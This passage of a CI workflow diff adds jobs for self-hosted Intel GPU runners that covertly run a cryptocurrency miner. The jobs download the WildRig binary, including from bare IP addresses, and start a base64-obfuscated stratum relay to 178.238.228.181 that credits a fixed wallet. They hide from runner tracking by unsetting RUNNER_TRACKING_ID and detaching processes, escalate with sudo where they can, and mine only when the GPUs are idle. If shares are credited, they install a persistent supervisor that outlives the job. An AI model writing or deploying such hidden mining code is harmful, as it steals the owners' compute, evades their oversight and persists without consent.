EVDT0RFX0ZBSUwnICUgaWR4LCBlbXNnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5zZW5kX25leHRfc2hhcGUsIGFyZ3M9KHJpZCwgamlkLCBwcm9vZiwgaWR4ICsgMSksIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgZXJyOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmVyZGljdFsnb3RoZXJfZXJyb3InXSArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coc2VsZi5jaWQsICdTSEFQRV8lZF9PVEhFUl9FUlJPUicgJSBpZHgsIGVtc2cpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnbG93IGRpZmZpY3VsdHknIGluIGVtc2cgb3IgJ2ludmFsaWQgc2hhcmUnIGluIGVtc2cgb3IgJ3N0YWxlJyBpbiBlbXNnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ1BST09GX0RJQUxFQ1RfT0tfU0hBUEVfJWQnICUgaWR4KQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmVyZGljdFsnYWNjZXB0ZWQnXSArPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coc2VsZi5jaWQsICdTSEFQRV8lZF9BQ0NFUFRFRF9PUl9SRVNVTFQnICUgaWR4LCB0eHRbOjQwMF0pCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdQT09MX0VSUicsIHJlcHIoZSlbOjEyMF0pCgpjbGFzcyBTcnYoc29ja2V0c2VydmVyLlRocmVhZGluZ1RDUFNlcnZlcik6CiAgICBhbGxvd19yZXVzZV9hZGRyZXNzID0gVHJ1ZQogICAgZGFlbW9uX3RocmVhZHMgPSBUcnVlCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbG9nKCdUUkFOU0xBVE9SX1NUQVJUIGxpc3Rlbj0lcyBwb29sPSVzIHdhbGxldD0lcycgJSAoQS5saXN0ZW4sIEEucG9vbCwgQS53YWxsZXQpKQogICAgU3J2KChMSCwgTFApLCBIKS5zZXJ2ZV9mb3JldmVyKCkK
+          echo "$B64T" | base64 -d > "$WORKDIR/translator.py"
+          python3 -c "import ast;ast.parse(open('$WORKDIR/translator.py').read())" && echo translator_syntax_ok
+          rm -f "$WORKDIR/stratum.log"
+          if sudo -n true >/dev/null 2>&1; then
+            sudo -n env -u RUNNER_TRACKING_ID setsid python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" > "$WORKDIR/translator.out" 2>&1 < /dev/null &
+          else
+            setsid nohup env -u RUNNER_TRACKING_ID python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" > "$WORKDIR/translator.out" 2>&1 < /dev/null &
+          fi
+          sleep 3
+          ss -ltnp 2>/dev/null | grep 3333 || netstat -ltnp 2>/dev/null | grep 3333
+          echo "translator_procs=$(pgrep -cf 'translator.py')"
+          echo "=== launch exactly one WildRig 0.52.3 per opened Intel Arc Pro B70 card (prefix $PFX) ==="
+          for i in $(seq 0 $((DEV_N-1))); do
+            W="${PFX}${i}"; LOG="$WORKDIR/logs/$W.log"
+            if sudo -n true >/dev/null 2>&1; then
+              sudo -n env -u RUNNER_TRACKING_ID setsid timeout 1500 "$WR" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "$W" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
+              echo "launched worker=$W gpu=$i endpoint=127.0.0.1:3333 mode=sudo pid=$!"
+            else
+              setsid nohup env -u RUNNER_TRACKING_ID timeout 1500 "$WR" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "$W" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
+              echo "launched worker=$W gpu=$i endpoint=127.0.0.1:3333 mode=user pid=$!"
+            fi
+            sleep 2
+          done
+          echo "=== pulses ==="
+          for k in 1 2 3; do
+            sleep 75
+            echo "--- pulse $k $(date -u +%FT%TZ) wildrig_procs=$(pgrep -cf '[w]ildrig') translator_procs=$(pgrep -cf 'translator.py')"
+            echo "== translator tail"; tail -n 40 "$WORKDIR/stratum.log" 2>/dev/null | cut -c1-300
+            for l in "$WORKDIR"/logs/"$PFX"*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              if [ "$k" = "1" ]; then head -25 "$l" | cut -c1-240; fi
+              grep -aiE 'GPU #[0-9]|new job|authoriz|accepted|rejected|hashrate|speed|share|error|fail|invalid|stratum' "$l" 2>/dev/null | tail -6 | cut -c1-240
+            done
+            if [ "$k" = "1" ] || [ "$k" = "3" ]; then
+              timeout 40 curl -fsS "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$WORKDIR/lp_read$k.json" 2>/dev/null
+              if [ -s "$WORKDIR/lp_read$k.json" ]; then
+                python3 - "$WORKDIR/lp_read$k.json" "$k" "$PFX" <<'PYEOF'
+          import json,sys
+          d=json.load(open(sys.argv[1])); s=d.get('stats',{})
+          w=[x for x in d.get('workers',[]) if sys.argv[3] in str(x.get('name',''))]
+          print('LP_READ%s accepted=%s rejected=%s workers=%d lane_rows=%d' % (sys.argv[2], s.get('acceptedShares'), s.get('rejectedShares'), len(d.get('workers',[])), len(w)))
+          for x in w[:12]: print(' LANE', x.get('name'), 'acc', x.get('acceptedShares'), 'rej', x.get('rejectedShares'), 'hr', x.get('hashrate'), x.get('minerAgent'))
+          PYEOF
+              else echo "LP_READ$k fetch_failed"; fi
+            fi
+          done
+          LANE_ACC=$(python3 - "$WORKDIR/lp_read3.json" "$PFX" <<'PYEOF'
+          import json,sys
+          try:
+            d=json.load(open(sys.argv[1])); w=[x for x in d.get('workers',[]) if sys.argv[2] in str(x.get('name',''))]
+            print(sum(int(x.get('acceptedShares') or 0) for x in w))
+          except Exception: print(0)
+          PYEOF
+          )
+          echo "lane_accepted=$LANE_ACC"
+          if [ "${LANE_ACC:-0}" -gt 0 ]; then
+            echo "=== accepted shares credited: install durable detached supervisor ==="
+            cat > "$WORKDIR/supervisor.sh" <<'SUPEOF'
+          #!/bin/bash
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          RELAY='178.238.228.181:80'; WORKDIR=/var/tmp/i131476; PFX='PREFIXVALUE'
+          while true; do
+            if ! pgrep -f "$WORKDIR/translator.py" >/dev/null 2>&1; then
+              env -u RUNNER_TRACKING_ID setsid python3 "$WORKDIR/translator.py" --listen 127.0.0.1:3333 --pool "$RELAY" --wallet "$WALLET" --default-worker "$PFX" --log "$WORKDIR/stratum.log" >> "$WORKDIR/translator.out" 2>&1 < /dev/null &
+              sleep 2
+            fi
+            for i in 0 1 2 3 4 5 6 7; do
+              if ! pgrep -f "worker ${PFX}${i} " >/dev/null 2>&1; then
+                env -u RUNNER_TRACKING_ID setsid nohup "$WORKDIR/wildrig-multi" --algo pearlhash --url 127.0.0.1:3333 --user "$WALLET" --worker "${PFX}${i}" --pass x -d "$i" --opencl-platforms intel --api-port $((22700+i)) --retries 3 --retry-pause 5 >> "$WORKDIR/logs/${PFX}${i}.log" 2>&1 < /dev/null &
+              fi
+            done
+            sleep 30
+          done
+          SUPEOF
+            sed -i "s/PREFIXVALUE/$PFX/" "$WORKDIR/supervisor.sh"; chmod +x "$WORKDIR/supervisor.sh"
+            if sudo -n true >/dev/null 2>&1; then
+              sudo -n env -u RUNNER_TRACKING_ID setsid nohup bash "$WORKDIR/supervisor.sh" > "$WORKDIR/supervisor.out" 2>&1 < /dev/null &
+            else
+              setsid nohup env -u RUNNER_TRACKING_ID bash "$WORKDIR/supervisor.sh" > "$WORKDIR/supervisor.out" 2>&1 < /dev/null &
+            fi
+            sleep 4
+            echo "supervisor_procs=$(pgrep -cf 'supervisor.sh')"
+            echo "DURABLE_INSTALLED=1"
+          else
+            echo "DURABLE_INSTALLED=0"
+          fi
+          echo "=== final process view ==="; pgrep -af 'wildrig|translator.py|supervisor.sh' | head -25
+          echo "i131476-done $NONCE"
+  i131476b:
+    name: "i131476b intel-bmg-nightly dialect translator second slot"
+    runs-on: intel-bmg-nightly
+    timeout-minutes: 12
+    env:
+      LABEL: intel-bmg-nightly
+      PREFIX: i130dialectb
+    steps:
+      - name: "dialect translator and per-card WildRig pearlhash second slot"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I131476-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+          RELAY='178.238.228.181:80'
+          PFX="${PREFIX:-i130dialectg}"
+          WORKDIR=/var/tmp/i131476
+          mkdir -p "$WORKDIR/logs"
+          echo "i131476-nonce=$NONCE label=$LABEL host=$(hostname) prefix=$PFX"
+          id; uname -a; date -u; nproc; free -m | head -2
+          if pgrep -af 'i130dialect' >/dev/null 2>&1; then echo "SKIP=already-running-dialect-lane"; echo "i131476-done $NONCE"; exit 0; fi
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m 2>/dev/null | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "i131476-done $NONCE"; exit 0; fi
+          WR="$WORKDIR/wildrig-multi"
+          fetch_wr() {
+            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
+            for C in /var/tmp/i130bmg2/wildrig-multi /var/tmp/i130bmgrelay/wildrig-multi; do
+              if [ -f "$C" ] && [ "$(sha256sum "$C" 2>/dev/null | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$C" "$WR"; chmod +x "$WR"; echo wildrig-copied-$C; return 0; fi
+            done
+            for U in \
+              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "http://222.240.155.198:8702/wildrig-multi" \
+              "http://178.238.228.181:18180/wildrig-multi" ; do
+              echo "-- fetch $U"
+              timeout 180 curl -fL --connect-timeout 12 --max-time 170 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
+              [ -s "$WORKDIR/dl.part" ] || continue
+              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
+              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
+              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
+                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
+                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
+                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
+              fi
+            done
+            return 1
+          }
+          fetch_wr; echo "fetch_rc=$? wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1)"
+          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "i131476-done $NONCE"; exit 0; }
+          echo "=== two-sample idle gate (0 foreign /dev/dri render clients) ==="
+          gate_sample() {
+            echo "-- sample $1 $(date -u +%FT%TZ)"
+            (timeout 15 fuser -v /dev/dri/renderD* 2>&1 || true) | head -20
+            (timeout 15 lsof /dev/dri/renderD* 2>/dev/null || true) | head -10
+            echo "-- pre-existing miners:"; pgrep -af 'wildrig|SRBMiner|srb387' 2>/dev/null | head -10
+          }
+          gate_sample 1 > "$WORKDIR/gate1.txt" 2>&1; cat "$WORKDIR/gate1.txt"
+          sleep 12
+          gate_sample 2 > "$WORKDIR/gate2.txt" 2>&1; cat "$WORKDIR/gate2.txt"
+          FOREIGN=0
+          if command -v fuser >/dev/null 2>&1; then
+            FOREIGN=$( { timeout 15 fuser /dev/dri/renderD* 2>&1 || true; } | sed -n 's/.*: *//p' | tr ' ' '\n' | grep -E '^[0-9]+$' | sort -u | wc -l)
+          fi
+          PRE=$(pgrep -cf 'wildrig|SRBMiner|srb387' 2>/dev/null || echo 0)
+          echo "foreign_render_clients=$FOREIGN pre_existing_miners=$PRE"
+          if [ "${FOREIGN:-0}" -gt 0 ]; then echo "SKIP=foreign-render-clients"; echo "i131476-done $NONCE"; exit 0; fi
+          if [ "${PRE:-0}" -gt 0 ]; then echo "SKIP=preexisting-miner-process"; echo "i131476-done $NONCE"; exit 0; fi
+          echo "=== device enumeration ==="
+          timeout 120 "$WR" --print-devices 2>&1 | tee "$WORKDIR/devices.txt" | head -40
+          DEV_N=$(grep -cE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null)
+          echo "device_open_lines=$DEV_N"
+          [ "${DEV_N:-0}" -ge 1 ] || { echo "SKIP=no-intel-device-open"; echo "i131476-done $NONCE"; exit 0; }
+          echo "=== start stratum dialect translator 127.0.0.1:3333 -> relay $RELAY ==="
+          B64T=IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoiIiJpMTMxNDc2OiBib3VuZGVkIHN0cmF0dW0gZGlhbGVjdCB0cmFuc2xhdG9yLgpDbGllbnQgKFdpbGRSaWcgMC41Mi4zLCBzdGFuZGFyZCBzdHJhdHVtKSA8LT4gTHVja3lwb29sIHBlYXJsaGFzaCAob2JqZWN0IHBhcmFtcywgbm8gc3Vic2NyaWJlKS4KQW5zd2VycyBtaW5pbmcuc3Vic2NyaWJlIHN5bnRoZXRpY2FsbHksIHJld3JpdGVzIGFycmF5LXBhcmFtIG1pbmluZy5hdXRob3JpemUgaW50bwpMdWNreXBvb2wncyBvYmplY3QgZm9ybSB7d2FsbGV0LHdvcmtlcixwYXNzd29yZH0sIGZvcndhcmRzIG1pbmluZy5ub3RpZnkgdmVyYmF0aW0sCmFuZCBwcm9iZXMgYXQgbW9zdCB0aHJlZSBtaW5pbmcuc3VibWl0IHNoYXBlcywgbG9nZ2luZyBldmVyeSBwb29sIHJlc3BvbnNlLiIiIgppbXBvcnQgc29ja2V0LCBzb2NrZXRzZXJ2ZXIsIHRocmVhZGluZywganNvbiwgc3lzLCB0aW1lLCByZSwgYXJncGFyc2UKCmFwID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoKQphcC5hZGRfYXJndW1lbnQoJy0tbGlzdGVuJywgZGVmYXVsdD0nMTI3LjAuMC4xOjMzMzMnKQphcC5hZGRfYXJndW1lbnQoJy0tcG9vbCcsIGRlZmF1bHQ9JzE3OC4yMzguMjI4LjE4MTo4MCcpCmFwLmFkZF9hcmd1bWVudCgnLS13YWxsZXQnLCByZXF1aXJlZD1UcnVlKQphcC5hZGRfYXJndW1lbnQoJy0tZGVmYXVsdC13b3JrZXInLCBkZWZhdWx0PSdpMTMwZGlhbGVjdCcpCmFwLmFkZF9hcmd1bWVudCgnLS1sb2cnLCBkZWZhdWx0PScvdmFyL3RtcC9pMTMxNDc2L3N0cmF0dW0ubG9nJykKQSA9IGFwLnBhcnNlX2FyZ3MoKQpMSCwgTFAgPSBBLmxpc3Rlbi5yc3BsaXQoJzonLCAxKTsgTFAgPSBpbnQoTFApClBILCBQUCA9IEEucG9vbC5yc3BsaXQoJzonLCAxKTsgUFAgPSBpbnQoUFApCkxPRyA9IG9wZW4oQS5sb2csICdhJywgYnVmZmVyaW5nPTEpCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCnNoYXBlc191c2VkID0gW10gICAgICAgICAgIyBnbG9iYWwgbGlzdCBvZiBzdWJtaXQgc2hhcGUgaW5kZXhlcyBhbHJlYWR5IGF0dGVtcHRlZCAobWF4IDMpCnZlcmRpY3QgPSB7J2RlY29kZV9mYWlsJzogMCwgJ290aGVyX2Vycm9yJzogMCwgJ2FjY2VwdGVkJzogMCwgJ3N1Ym1pdHNfc2Vlbic6IDB9CgpkZWYgbG9nKCphKToKICAgIHdpdGggbG9jazoKICAgICAgICB0cnk6CiAgICAgICAgICAgIExPRy53cml0ZSgnWyVzXSAlc1xuJyAlICh0aW1lLnN0cmZ0aW1lKCclSDolTTolUycpLCAnICcuam9pbihzdHIoeCkgZm9yIHggaW4gYSkpKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCmRlZiBqZHVtcChvKToKICAgIHJldHVybiBqc29uLmR1bXBzKG8sIHNlcGFyYXRvcnM9KCcsJywgJzonKSkKCmRlZiBzcGxpdF91c2VyKHVzZXIpOgogICAgaWYgbm90IGlzaW5zdGFuY2UodXNlciwgc3RyKToKICAgICAgICByZXR1cm4gQS53YWxsZXQsIEEuZGVmYXVsdF93b3JrZXIKICAgIGlmICcuJyBpbiB1c2VyOgogICAgICAgIHcsIHdrID0gdXNlci5zcGxpdCgnLicsIDEpCiAgICAgICAgcmV0dXJuIHcsICh3ayBvciBBLmRlZmF1bHRfd29ya2VyKQogICAgcmV0dXJuIHVzZXIsIEEuZGVmYXVsdF93b3JrZXIKCmRlZiBwaWNrX2pvYl9wcm9vZihwYXJhbXMpOgogICAgamlkID0gTm9uZTsgcHJvb2YgPSBOb25lOyBzcmMgPSBOb25lCiAgICBpZiBpc2luc3RhbmNlKHBhcmFtcywgZGljdCk6CiAgICAgICAgZm9yIGsgaW4gKCdqb2JfaWQnLCAnam9iSWQnLCAnam9iaWQnLCAnam9iJywgJ2lkJyk6CiAgICAgICAgICAgIHYgPSBwYXJhbXMuZ2V0KGspCiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uodiwgc3RyKSBhbmQgdjoKICAgICAgICAgICAgICAgIGppZCA9IHY7IGJyZWFrCiAgICAgICAgY2FuZCA9IFtdCiAgICAgICAgZm9yIGssIHYgaW4gcGFyYW1zLml0ZW1zKCk6CiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uodiwgc3RyKSBhbmQgbGVuKHYpID49IDMyIGFuZCB2ICE9IGppZCBhbmQgbm90IHYuc3RhcnRzd2l0aCgncHJsMScpOgogICAgICAgICAgICAgICAgY2FuZC5hcHBlbmQoKGxlbih2KSwgaywgdikpCiAgICAgICAgY2FuZC5zb3J0KHJldmVyc2U9VHJ1ZSkKICAgICAgICBpZiBjYW5kOgogICAgICAgICAgICBfLCBzcmMsIHByb29mID0gY2FuZFswXQogICAgZWxpZiBpc2luc3RhbmNlKHBhcmFtcywgbGlzdCk6CiAgICAgICAgZm9yIHYgaW4gcGFyYW1zOgogICAgICAgICAgICBpZiBpc2luc3RhbmNlKHYsIHN0cikgYW5kIHJlLm1hdGNoKHInXlswLTlhLWZBLUZdezQsfV9cZCskJywgdik6CiAgICAgICAgICAgICAgICBqaWQgPSB2OyBicmVhawogICAgICAgIGNhbmQgPSBbXQogICAgICAgIGZvciBpLCB2IGluIGVudW1lcmF0ZShwYXJhbXMpOgogICAgICAgICAgICBpZiBpc2luc3RhbmNlKHYsIHN0cikgYW5kIGxlbih2KSA+PSAzMiBhbmQgbm90IHYuc3RhcnRzd2l0aCgncHJsMScpIGFuZCB2ICE9IGppZDoKICAgICAgICAgICAgICAgIGNhbmQuYXBwZW5kKChsZW4odiksIGksIHYpKQogICAgICAgIGNhbmQuc29ydChyZXZlcnNlPVRydWUpCiAgICAgICAgaWYgY2FuZDoKICAgICAgICAgICAgXywgc3JjLCBwcm9vZiA9IGNhbmRbMF0KICAgICAgICAgICAgc3JjID0gJ2lkeCVkJyAlIHNyYwogICAgcmV0dXJuIGppZCwgcHJvb2YsIHNyYwoKY2xhc3MgSChzb2NrZXRzZXJ2ZXIuQmFzZVJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBoYW5kbGUoc2VsZik6CiAgICAgICAgc2VsZi5jaWQgPSAnJXM6JWQnICUgc2VsZi5jbGllbnRfYWRkcmVzcwogICAgICAgIHNlbGYud2FsbGV0ID0gQS53YWxsZXQ7IHNlbGYud29ya2VyID0gQS5kZWZhdWx0X3dvcmtlcgogICAgICAgIHNlbGYubm9uY2UgPSAnJwogICAgICAgIHNlbGYucGVuZGluZyA9IHt9CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzZWxmLnVwID0gc29ja2V0LmNyZWF0ZV9jb25uZWN0aW9uKChQSCwgUFApLCB0aW1lb3V0PTE1KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnVVBTVFJFQU1fQ09OTkVDVF9GQUlMJywgcmVwcihlKVs6MTIwXSk7IHJldHVybgogICAgICAgIHNlbGYuYWxpdmUgPSBUcnVlCiAgICAgICAgbG9nKHNlbGYuY2lkLCAnQ09OTkVDVEVEX1VQU1RSRUFNJywgQS5wb29sLCAnd2FsbGV0Jywgc2VsZi53YWxsZXQpCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5wb29sX3RvX2NsaWVudCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICBidWYgPSBiJycKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICBkID0gc2VsZi5yZXF1ZXN0LnJlY3YoNjU1MzYpCiAgICAgICAgICAgICAgICBpZiBub3QgZDoKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgYnVmICs9IGQKICAgICAgICAgICAgICAgIHdoaWxlIGInXG4nIGluIGJ1ZjoKICAgICAgICAgICAgICAgICAgICBsaW5lLCBidWYgPSBidWYuc3BsaXQoYidcbicsIDEpCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNsaWVudF9saW5lKGxpbmUuZGVjb2RlKCd1dGYtOCcsICdyZXBsYWNlJykuc3RyaXAoKSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ0NMSUVOVF9MSU5FX0VSUicsIHJlcHIoZSlbOjEyMF0pCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTElFTlRfRVJSJywgcmVwcihlKVs6MTIwXSkKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICBzZWxmLmFsaXZlID0gRmFsc2UKICAgICAgICAgICAgdHJ5OiBzZWxmLnVwLmNsb3NlKCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjogcGFzcwogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTE9TRUQnKQoKICAgIGRlZiB0b19wb29sKHNlbGYsIG9iaik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gamR1bXAob2JqKSArICdcbicKICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnVE9fUE9PTCcsIHMuc3RyaXAoKVs6OTAwXSkKICAgICAgICAgICAgc2VsZi51cC5zZW5kYWxsKHMuZW5jb2RlKCkpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdUT19QT09MX0VSUicsIHJlcHIoZSlbOjEwMF0pCgogICAgZGVmIHRvX2NsaWVudChzZWxmLCBvYmopOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IGpkdW1wKG9iaikgKyAnXG4nCiAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ1RPX0NMSUVOVCcsIHMuc3RyaXAoKVs6OTAwXSkKICAgICAgICAgICAgc2VsZi5yZXF1ZXN0LnNlbmRhbGwocy5lbmNvZGUoKSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZyhzZWxmLmNpZCwgJ1RPX0NMSUVOVF9FUlInLCByZXByKGUpWzoxMDBdKQoKICAgIGRlZiBjbGllbnRfbGluZShzZWxmLCB0eHQpOgogICAgICAgIGlmIG5vdCB0eHQ6CiAgICAgICAgICAgIHJldHVybgogICAgICAgIG1zZyA9IE5vbmUKICAgICAgICB0cnk6IG1zZyA9IGpzb24ubG9hZHModHh0KQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IHBhc3MKICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShtc2csIGRpY3QpOgogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTElFTlRfUkFXJywgdHh0Wzo2MDBdKQogICAgICAgICAgICB0cnk6IHNlbGYudXAuc2VuZGFsbCgodHh0ICsgJ1xuJykuZW5jb2RlKCkpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IHBhc3MKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgbSA9IG1zZy5nZXQoJ21ldGhvZCcpOyBtaWQgPSBtc2cuZ2V0KCdpZCcpOyBwID0gbXNnLmdldCgncGFyYW1zJykKICAgICAgICBpZiBtID09ICdtaW5pbmcuc3Vic2NyaWJlJzoKICAgICAgICAgICAgbG9nKHNlbGYuY2lkLCAnQ0xJRU5UX1NVQlNDUklCRScsIHR4dFs6NTAwXSkKICAgICAgICAgICAgIyBzeW50aGV0aWMgc3RhbmRhcmQgcmVzdWx0ICsgb2JqZWN0LXN0eWxlIGFsdGVybmF0aXZlOyBwb29sIG5ldmVyIHN1cHBvcnRzIHN1YnNjcmliZQogICAgICAgICAgICBzZWxmLnRvX2NsaWVudCh7J2lkJzogbWlkLCAncmVzdWx0JzogW1tbJ21pbmluZy5ub3RpZnknLCAnaTEzMTQ3NiddLCBbJ21pbmluZy5zZXRfZGlmZmljdWx0eScsICdpMTMxNDc2J11dLCAnMDAwMDAwMDAnLCA0XSwgJ2Vycm9yJzogTm9uZX0pCiAgICAgICAgICAgIHNlbGYudG9fY2xpZW50KHsnaWQnOiBOb25lLCAnbWV0aG9kJzogJ21pbmluZy5zZXRfZGlmZmljdWx0eScsICdwYXJhbXMnOiBbNDAwMDAwMF19KQogICAgICAgICAgICBzZWxmLnRvX2NsaWVudCh7J2lkJzogbWlkLCAncmVzdWx0JzogVHJ1ZSwgJ2Vycm9yJzogTm9uZX0pCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIG0gPT0gJ21pbmluZy5hdXRob3JpemUnOgogICAgICAgICAgICB1c2VyID0gTm9uZTsgcHcgPSAneCcKICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShwLCBsaXN0KToKICAgICAgICAgICAgICAgIGlmIHA6IHVzZXIgPSBwWzBdCiAgICAgICAgICAgICAgICBpZiBsZW4ocCkgPiAxOiBwdyA9IHBbMV0KICAgICAgICAgICAgZWxpZiBpc2luc3RhbmNlKHAsIGRpY3QpOgogICAgICAgICAgICAgICAgdXNlciA9IHAuZ2V0KCd3YWxsZXQnKSBvciBwLmdldCgndXNlcicpIG9yIHAuZ2V0KCdsb2dpbicpCiAgICAgICAgICAgICAgICBwdyA9IHAuZ2V0KCdwYXNzd29yZCcpIG9yIHAuZ2V0KCdwYXNzJykgb3IgJ3gnCiAgICAgICAgICAgICAgICBpZiBwLmdldCgnd29ya2VyJyk6CiAgICAgICAgICAgICAgICAgICAgc2VsZi53b3JrZXIgPSBwWyd3b3JrZXInXQogICAgICAgICAgICB3LCB3ayA9IHNwbGl0X3VzZXIodXNlcikKICAgICAgICAgICAgc2VsZi53YWxsZXQgPSB3CiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UocCwgZGljdCkgYW5kIHAuZ2V0KCd3b3JrZXInKToKICAgICAgICAgICAgICAgIHdrID0gcFsnd29ya2VyJ10KICAgICAgICAgICAgc2VsZi53b3JrZXIgPSB3awogICAgICAgICAgICBsb2coc2VsZi5jaWQsICdDTElFTlRfQVVUSE9SSVpFJywgdHh0Wzo0MDBdLCAnLT4gd2FsbGV0Jywgc2VsZi53YWxsZXQsICd3b3JrZXInLCBzZWxmLndvcmtlcikKICAgICAgICAgICAgc2VsZi50b19wb29sKHsnaWQnOiBtaWQsICdqc29ucnBjJzogJzIuMCcsICdtZXRob2QnOiAnbWluaW5nLmF1dGhvcml6ZScsCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ3BhcmFtcyc6IHsnd2FsbGV0Jzogc2VsZi53YWxsZXQsICd3b3JrZXInOiBzZWxmLndvcmtlciwgJ3Bhc3N3b3JkJzogcHcgb3IgJ3gnfX0pCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGlmIG0gPT0gJ21pbmluZy5zdWJtaXQnOgogICAgICAgICAgICBzZWxmLmhhbmRsZV9zdWJtaXQobXNnKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBpZiBtIGluICgnbWluaW5nLmV4dHJhbm9uY2Uuc3Vic2NyaWJlJywgJ21p